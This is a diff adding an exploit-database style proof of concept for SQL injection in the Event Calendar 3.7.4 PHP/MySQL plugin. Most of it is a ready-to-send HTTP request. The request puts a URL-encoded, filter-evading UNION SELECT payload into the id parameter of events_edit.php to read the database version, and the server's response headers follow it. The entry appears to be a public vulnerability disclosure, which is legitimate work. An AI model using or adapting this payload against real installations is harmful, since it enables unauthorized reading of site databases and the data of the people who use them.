@@ -1,0 +1,38 @@
+# Exploit Title: Event Calendar 3.7.4 - SQL Injection
+# Dork: N/A
+# Date: 2019-01-10
+# Exploit Author: Ihsan Sencan
+# Vendor Homepage: http://ezcode.pt/
+# Software Link: https://codecanyon.net/item/event-calendar-phpmysql-plugin/19246267
+# Version: 3.7.4
+# Category: Webapps
+# Tested on: WiN7_x64/KaLiLinuX_x64
+# CVE: N/A
+
+# POC: 
+# 1) 
+# http://localhost/[PATH]/events_edit.php?id=[SQL]
+# 
+
+GET /[PATH]/events_edit.php?id=%2d%31%30%33%31%27%20%2f%2a%21%31%31%31%311%55%4e%49%4f%4e%20%2a%2f%2f%2a!11111SELE%43%54%2a%2f%20%31%2c%32%2c%33%2c%76%65%72%73%69%6f%6e%28%29%2c%35%2c%36%2c%37,8--%20- HTTP/1.1
+Host: TARGET
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+Cookie: PHPSESSID=84955lhp1purfrvdrvhs7a00q2; EU_COOKIE_LAW_CONSENT=true
+DNT: 1
+Connection: keep-alive
+Upgrade-Insecure-Requests: 1
+HTTP/1.1 200 OK
+Date: Wed, 09 Jan 2019 23:31:12 GMT
+Server: Apache
+X-Powered-By: PHP/5.5.38
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
+Pragma: no-cache
+Upgrade: h2,h2c
+Connection: Upgrade, Keep-Alive
+Keep-Alive: timeout=5, max=100
+Transfer-Encoding: chunked
+Content-Type: text/html; charset=utf-8
